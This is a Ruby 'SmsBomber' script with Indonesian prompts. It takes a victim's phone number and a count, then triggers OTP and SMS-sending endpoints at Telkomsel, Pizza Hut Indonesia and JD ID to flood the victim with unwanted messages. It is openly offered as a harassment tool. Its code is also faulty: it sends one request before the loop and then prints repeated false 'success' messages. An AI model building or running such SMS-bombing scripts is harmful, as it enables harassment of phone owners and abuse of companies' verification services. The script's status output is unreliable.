require 'net/http'
require 'uri'

def target_()
 print "Nomor Target : "
 $target =gets.chomp
 print "Jumlah Bomb : "
 $jumlah = gets.chomp.to_i
 return $jumlah,$target
end

#Telkomsel
def telkomsel(target)
 uri = URI.parse("https://tdwidm.telkomsel.com/passwordless/start")
 request = Net::HTTP::Post.new(uri)
 request.set_form_data(
   "connection" => "sms",
   "phone_number" => "#{target}",
 )
 
 req_options = {
   use_ssl: uri.scheme == "https",
 }
 
 response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
   http.request(request)
 end
end

#PHD
def phd(target)
 uri = URI.parse("https://www.phd.co.id/en/users/sendOTP")
 request = Net::HTTP::Post.new(uri)
 request.set_form_data(
  "phone_number" => "#{target}",
 )
 
 req_options = {
  use_ssl: uri.scheme == "https",
 }
 
 response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
  http.request(request)
 end
end


 #JD ID
 def jd(target)
 uri = URI.parse("http://sc.jd.id/phone/sendPhoneSms")
 request = Net::HTTP::Post.new(uri)
 request.set_form_data(
  "phone" => "#{target}",
  "smsType" => "1",
 )
 
 req_options = {
  use_ssl: uri.scheme == "https",
 }
 
 response = Net::HTTP.start(uri.hostname, uri.port, req_options) do |http|
  http.request(request)
 end
end

system("figlet SmsBomber")      


puts "---------------------------------------[ @zetc0de ]---------"

puts "-=[ Bomber Via? ]=-"
puts "1. Telkomsel [Khusus target nomor telkomsel] +62xxx"
puts "2. Pizza Hut"
puts "3. JD ID"
puts
print "Pilih 1-3 : "
target_via = gets.chomp

case target_via
when "1"
	target_()
	telkomsel($target)	
	for i in 1..$jumlah
	 puts "On Progress..."
	 sleep(3) 
	 puts "Bomb ke-#{i} Sukses Boss!"
	end

when "2"
	target_()
	phd($target)	
	for i in 1..$jumlah
	 puts "On Progress..."
	 sleep(35) 
	 puts "Bomb ke-#{i} Sukses Boss!"
	end

when "3"
	target_()
	jd($target)	
	for i in 1..$jumlah
	 puts "On Progress..."
	 sleep(3) 
	 puts "Bomb ke-#{i} Sukses Boss!"
	end


end


